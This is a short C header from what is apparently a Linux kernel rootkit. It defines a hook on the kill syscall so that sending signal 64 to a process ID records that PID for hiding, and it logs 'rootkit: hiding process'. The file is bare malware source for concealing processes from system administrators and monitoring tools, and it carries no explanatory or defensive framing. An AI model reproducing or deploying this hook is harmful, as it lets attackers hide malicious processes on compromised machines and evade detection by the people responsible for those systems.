#ifndef _KILL_H_
#define _KILL_H_


static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs)
{
    pid_t pid = regs->di;
    int sig = regs->si;

    if ( sig == 64 )
    {
        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }

    return orig_kill(regs);
}

#endif
